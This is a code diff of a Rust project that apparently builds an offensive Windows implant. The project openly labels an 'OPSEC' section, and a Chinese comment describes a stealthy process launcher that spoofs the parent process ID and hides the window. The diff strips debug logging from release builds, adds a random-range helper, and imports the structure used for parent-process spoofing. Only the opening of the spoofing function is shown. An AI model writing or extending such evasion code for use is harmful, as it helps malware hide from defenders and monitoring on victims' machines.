@@ -166,10 +166,12 @@ mod tests {
     }
 }
 
-/// Windows debug logging (Enabled for inspection)
-pub fn db_print(msg: &str) {
-    use log::debug;
-    debug!("{}", msg);
+/// Debug logging — completely eliminated in release builds.
+/// Prefer using `dbg_print!` macro directly for zero-cost in release.
+#[inline(always)]
+pub fn db_print(_msg: &str) {
+    #[cfg(debug_assertions)]
+    log::debug!("{}", _msg);
 }
 
 // --- 🛡️ OPSEC: Dependency-free PRNG to avoid BCrypt initialization crashes ---
@@ -201,6 +203,13 @@ pub fn random_bool(p: f64) -> bool {
     next_u32() < threshold
 }
 
+/// Generate a random u32 in range [min, max] (inclusive)
+pub fn random_range(min: u32, max: u32) -> u32 {
+    if min >= max { return min; }
+    let range = max - min + 1;
+    min + (next_u32() % range)
+}
+
 /// ⚡ 隐蔽进程启动：使用 PPID Spoofing 假冒父进程并隐藏窗口
 #[cfg(windows)]
 pub fn spawn_spoofed_process(cmd: &str, parent_name: &str) -> Option<u32> {
@@ -210,6 +219,7 @@ pub fn spawn_spoofed_process(cmd: &str, parent_name: &str) -> Option<u32> {
     use winapi::um::tlhelp32::*;
     use winapi::um::handleapi::*;
     use winapi::shared::minwindef::*;
+    use winapi::um::winbase::STARTUPINFOEXW;
 
     unsafe {
         // 1. 查找父进程 PID
